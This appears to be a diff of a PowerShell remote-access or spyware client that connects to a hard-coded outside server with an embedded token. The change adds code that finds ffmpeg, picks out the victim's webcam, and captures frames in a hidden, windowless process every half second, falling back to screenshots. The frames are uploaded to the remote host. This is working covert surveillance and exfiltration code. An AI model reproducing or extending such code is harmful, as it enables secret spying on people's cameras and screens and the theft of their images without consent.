@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.8"
+$Version = "3.1.9"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -415,20 +415,72 @@ function ScreenshotJpeg {
     `$bmp.Dispose()
     return `$ms.ToArray()
 }
-# --- Screenshot stream (no camera access, no permission prompts) ---
-`$i=0
-try {
-    while (`$true) {
-        try {
-            `$bytes = ScreenshotJpeg
-            UploadFrame `$bytes
-            `$i++
-        } catch { break }
-        if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
-        Start-Sleep -Milliseconds 500
+# --- Find ffmpeg ---
+`$ffmpeg = `$null
+foreach (`$p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
+    if (Get-Command `$p -ErrorAction SilentlyContinue) { `$ffmpeg = `$p; break }
+    if (Test-Path `$p) { `$ffmpeg = `$p; break }
+}
+# --- Try ffmpeg webcam, fall back to screenshot ---
+`$usedFfmpeg = `$false
+if (`$ffmpeg) {
+    try {
+        # enumerate DirectShow video devices
+        `$devOut = & `$ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Out-String
+        `$devName = `$null
+        foreach (`$line in (`$devOut -split "`n")) {
+            if (`$line -match '"(.+?)"' -and `$line -match 'video') { `$devName = `$Matches[1]; break }
+        }
+        if (-not `$devName) {
+            # fallback: grab first quoted string from dshow output
+            if (`$devOut -match '"(.+?)"') { `$devName = `$Matches[1] }
+        }
+        if (`$devName) {
+            `$usedFfmpeg = `$true
+            `$i = 0
+            while (`$true) {
+                `$tmpJpeg = [System.IO.Path]::GetTempFileName() + '.jpg'
+                try {
+                    `$psi = New-Object System.Diagnostics.ProcessStartInfo `$ffmpeg
+                    `$psi.Arguments = "-y -f dshow -i video=```"`$devName```" -vframes 1 -q:v 5 -f image2 ```"`$tmpJpeg```""
+                    `$psi.WindowStyle = 'Hidden'; `$psi.CreateNoWindow = `$true
+                    `$psi.RedirectStandardError = `$true; `$psi.UseShellExecute = `$false
+                    `$proc = [System.Diagnostics.Process]::Start(`$psi)
+                    `$proc.WaitForExit(4000) | Out-Null; `$proc.Dispose()
+                    if (Test-Path `$tmpJpeg) {
+                        `$bytes = [System.IO.File]::ReadAllBytes(`$tmpJpeg)
+                        if (`$bytes.Length -gt 500) { UploadFrame `$bytes }
+                    }
+                } catch {}
+                finally { try { Remove-Item `$tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
+                `$i++
+                if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
+                Start-Sleep -Milliseconds 500
+            }
+        } else {
+            throw 'no video device found'
+        }
+    } catch {
+        Report "[!] ffmpeg webcam failed: `$(`$_.Exception.Message) -- falling back to screen capture`n"
+        `$usedFfmpeg = `$false
     }
-} catch {
-    Report "[!] Screenshot stream failed: `$(`$_.Exception.Message)`n"
+}
+if (-not `$usedFfmpeg) {
+    # Screenshot fallback
+    `$i = 0
+    try {
+        while (`$true) {
+            try {
+                `$bytes = ScreenshotJpeg
+                UploadFrame `$bytes
+                `$i++
+            } catch { break }
+            if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
+            Start-Sleep -Milliseconds 500
+        }
+    } catch {
+        Report "[!] Screenshot stream failed: `$(`$_.Exception.Message)`n"
+    }
 }
 "@
         try {
@@ -508,21 +560,62 @@ try {
             $bmp.Dispose()
             return $ms.ToArray()
         }
-        # Screenshot stream (no camera access, no permission prompts)
-        $i = 0
-        try {
-            while ($sharedState.CameraRunning) {
-                try {
-                    $bytes = ScreenshotJpeg
-                    UploadFrame $bytes
-                    $i++
-                } catch { break }
-                Start-Sleep -Milliseconds 500
+        # --- Find ffmpeg ---
+        $ffmpeg = $null
+        foreach ($p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
+            if (Get-Command $p -ErrorAction SilentlyContinue) { $ffmpeg = $p; break }
+            if (Test-Path $p) { $ffmpeg = $p; break }
+        }
+        $usedFfmpeg = $false
+        if ($ffmpeg) {
+            try {
+                $devOut = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Out-String
+                $devName = $null
+                foreach ($line in ($devOut -split "`n")) {
+                    if ($line -match '"(.+?)"' -and $line -match 'video') { $devName = $Matches[1]; break }
+                }
+                if (-not $devName -and $devOut -match '"(.+?)"') { $devName = $Matches[1] }
+                if ($devName) {
+                    $usedFfmpeg = $true
+                    $i = 0
+                    while ($sharedState.CameraRunning) {
+                        $tmpJpeg = [System.IO.Path]::GetTempFileName() + '.jpg'
+                        try {
+                            $psi = New-Object System.Diagnostics.ProcessStartInfo $ffmpeg
+                            $psi.Arguments = "-y -f dshow -i video=`"`$devName`" -vframes 1 -q:v 5 -f image2 `"`$tmpJpeg`""
+                            $psi.WindowStyle = 'Hidden'; $psi.CreateNoWindow = $true
+                            $psi.RedirectStandardError = $true; $psi.UseShellExecute = $false
+                            $proc = [System.Diagnostics.Process]::Start($psi)
+                            $proc.WaitForExit(4000) | Out-Null; $proc.Dispose()
+                            if (Test-Path $tmpJpeg) {
+                                $bytes = [System.IO.File]::ReadAllBytes($tmpJpeg)
+                                if ($bytes.Length -gt 500) { UploadFrame $bytes }
+                            }
+                        } catch {}
+                        finally { try { Remove-Item $tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
+                        $i++
+                        Start-Sleep -Milliseconds 500
+                    }
+                } else { throw 'no video device found' }
+            } catch {
+                Report "[!] ffmpeg webcam failed: $($_.Exception.Message) -- falling back to screen capture`n"
+                $usedFfmpeg = $false
             }
-        } catch {
-            Report "[!] Screenshot stream failed: $($_.Exception.Message)`n"
-        } finally {
-            $sharedState.CameraRunning = $false
+        }
+        if (-not $usedFfmpeg) {
+            $i = 0
+            try {
+                while ($sharedState.CameraRunning) {
+                    try {
+                        $bytes = ScreenshotJpeg
+                        UploadFrame $bytes
+                        $i++
+                    } catch { break }
+                    Start-Sleep -Milliseconds 500
+                }
+            } catch {
+                Report "[!] Screenshot stream failed: $($_.Exception.Message)`n"
+            }
         }
     }) | Out-Null
     $script:cameraTask = $ps
